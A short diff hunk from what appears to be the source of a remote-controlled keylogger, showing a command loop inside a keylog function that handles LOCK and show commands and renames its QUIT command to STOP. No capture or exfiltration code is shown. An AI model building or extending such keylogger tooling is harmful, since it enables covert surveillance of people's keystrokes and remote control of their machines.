@@ -78,7 +78,7 @@ def keylog(main_connect):
             show(main_connect)
         elif "LOCK" in msg:
             lock()
-        elif "QUIT" in msg:
+        elif "STOP" in msg:
             cmd_flag = 4
             return
     return
